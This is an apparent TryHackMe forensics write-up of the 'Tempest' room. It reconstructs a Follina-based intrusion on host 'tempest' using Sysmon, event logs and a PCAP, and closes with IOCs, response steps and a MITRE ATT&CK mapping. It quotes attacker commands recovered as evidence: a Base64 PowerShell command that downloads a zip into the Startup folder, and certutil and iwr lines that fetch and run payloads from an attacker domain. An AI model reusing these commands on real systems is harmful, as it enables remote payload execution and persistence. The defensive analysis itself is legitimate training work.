# Tempest

## Room Overview
Incident Responder role investigating a CRITICAL severity alert triaged by SOC. Captured artefacts (PCAP, Sysmon and Windows event logs) from a compromised machine require full analysis to reconstruct the intrusion from initial access through persistence.

## Category
- Incident Response / Digital Forensics

## Objective
- Reconstruct the full attack chain from endpoint and network artefacts
- Identify the initial access vector and exploited vulnerability
- Trace payload delivery, C2 infrastructure, and post-exploitation activity
- Identify persistence mechanisms

## Tools & Environment
- TryHackMe AttackBox
- Event Viewer
- SysmonView
- EvtxECmd
- Timeline Explorer
- Wireshark
- Brim
- CyberChef
- VirusTotal

## Investigation Process

### Initial Triage
Three artefacts provided: `capture.pcap`, `sysmon.evtx`, `windows.evtx`. Converted Sysmon logs to CSV for Timeline Explorer:
```powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```
Sysmon EVTX also exported to XML via Event Viewer for SysmonView analysis. Hashed all three source artefacts for chain of custody:
```powershell
Get-FileHash .\sysmon.evtx -Algorithm SHA256
```

### Initial Access
SOC analyst confirmed the intrusion began with a malicious `.doc` downloaded via `chrome.exe`. Followed child processes of `winword.exe` in SysmonView. Identified the malicious document `free_magicules.doc`, executed by user `benimaru` on host `tempest`.

Process tree showed repeated PID 496 activity. SysmonView DNS query logs showed resolution of `phishteam[.]xyz` to `167.71.199.191`.

Searched Timeline Explorer for Base64 strings in the Executable Info tab. Recovered an encoded PowerShell command tied to PID 496:
````
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
````
Decoded via CyberChef. Resolves to a command that sets the Startup folder as working directory, downloads `update.zip` from `hxxp[://]phishteam[.]xyz/02dcf07/update.zip`, extracts it into Startup, then deletes the archive. This establishes autostart persistence.

Same Executable Info tab referenced `msdt.exe` against PID 496. Cross-referencing `msdt.exe` and PID 496 in open-source research identified the exploit: **CVE-2022-30190 (Follina)**, MSDT URL protocol abuse for remote code execution via a malicious Office document.

### Stage 2, Autostart Execution
Per investigation guidance, autostart execution reflects `explorer.exe` as the parent process ID following user logon. Filtered Timeline Explorer for `explorer.exe`, found in Executable Info: `-w hidden -noni certutil`. Full command recovered:
````
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'hxxp[://]phishteam[.]xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
````
`certutil.exe` abused as a LOLBIN to download and execute `first.exe`. SHA256 hash recovered from the Payload Data3 tab. Filtered Event ID 22 (DNS query) for `first.exe` activity. Identified the second-stage C2 domain `resolvecyber.xyz`.

### Network Analysis
Pivoted to `capture.pcap` in Wireshark and Brim. Filter:
````
http.host=="phishteam.xyz"
````
Identified the malicious payload URL. CyberChef Magic function decoded additional Base64 strings recovered from the capture, revealing a password used by the attacker (decoded via CyberChef).

Port 5985 (WinRM) identified in traffic, confirming a remote shell access vector. Further decoding revealed:
````
powershell iwr hxxp[://]phishteam[.]xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
````
Searched logs for `ch.exe`. Recovered the SHA256 hash. VirusTotal lookup identified the binary as **Chisel**, a reverse SOCKS proxy tool, confirming the attacker used WinRM for authenticated access and Chisel for tunneling.

### Privilege Escalation & Persistence
Attacker downloaded `spf.exe`, identified as **PrintSpoofer**. Used to exploit `SeImpersonatePrivilege`, escalating privileges. Final payload `final.exe` executed to establish a C2 connection on port 8080.

Searched Sysmon logs for `user/add` activity. Identified two new local accounts created: `shion`, `shuna`.

## Findings
- **Initial access:** Malicious `.doc` (`free_magicules.doc`) exploiting CVE-2022-30190 (Follina)
- **Victim:** User `benimaru`, host `tempest`
- **C2 domain (stage 1):** `phishteam[.]xyz` resolving to `167.71.199.191`
- **C2 domain (stage 2):** `resolvecyber.xyz`
- **Persistence (autostart):** `update.zip` extracted to the Startup folder
- **LOLBIN abuse:** `certutil.exe` used to download `first.exe`
- **first.exe SHA256:** `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D`
- **Tunneling tool:** Chisel (`ch.exe`), reverse SOCKS proxy
- **ch.exe SHA256:** `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
- **Lateral movement:** WinRM (port 5985) authenticated access
- **Privilege escalation:** PrintSpoofer (`spf.exe`) exploiting `SeImpersonatePrivilege`
- **Final C2 channel:** `final.exe` on port 8080
- **Persistence (accounts):** New local accounts `shion`, `shuna` created

## Analysis & Response
- Isolate host `tempest`
- Disable accounts `shion` and `shuna`
- Block `phishteam[.]xyz` and `resolvecyber.xyz` at the perimeter
- Hunt for `first.exe`, `ch.exe`, `spf.exe`, `final.exe` hashes across the environment
- Audit WinRM configuration, restrict remote management access
- Patch CVE-2022-30190 (Follina) across all endpoints running affected Office versions

## MITRE ATT&CK
- Exploitation for Client Execution (T1203): Follina exploited via a malicious Word document
- Obfuscated Files or Information (T1027): Base64 encoded PowerShell payloads
- Deobfuscate/Decode (T1140): CyberChef used to recover encoded commands
- Boot or Logon Autostart Execution: Startup Folder (T1547.001): payload persisted via the Startup folder
- PowerShell (T1059.001): payload execution and decoding
- Ingress Tool Transfer (T1105): `update.zip`, `first.exe`, `ch.exe`, `spf.exe` downloaded across multiple stages
- Application Layer Protocol (T1071): C2 communication over HTTP
- Protocol Tunneling (T1572): Chisel used for SOCKS proxy tunneling
- Remote Services: Windows Remote Management (T1021.006): WinRM used for lateral movement and authentication
- Token Impersonation/Theft (T1134.001): PrintSpoofer abusing `SeImpersonatePrivilege`
- Create Account: Local Account (T1136.001): `shion`, `shuna` created for persistence

## Key Takeaways
- Base64-encoded PowerShell in Sysmon's Executable Info field is a high-value pivot point for uncovering staged payloads.
- LOLBIN abuse (`certutil`) for payload download remains a consistent technique across malware chains.
- Chisel is a common attacker tool for SOCKS proxy tunneling. VirusTotal hash lookup gives fast confirmation.
- PrintSpoofer combined with `SeImpersonatePrivilege` is a frequent Windows privilege escalation path worth fingerprinting in detection rules.
- Multi-stage payload delivery (doc, PowerShell, certutil, Chisel, PrintSpoofer) shows the value of correlating Sysmon, DNS, and PCAP data sources together.
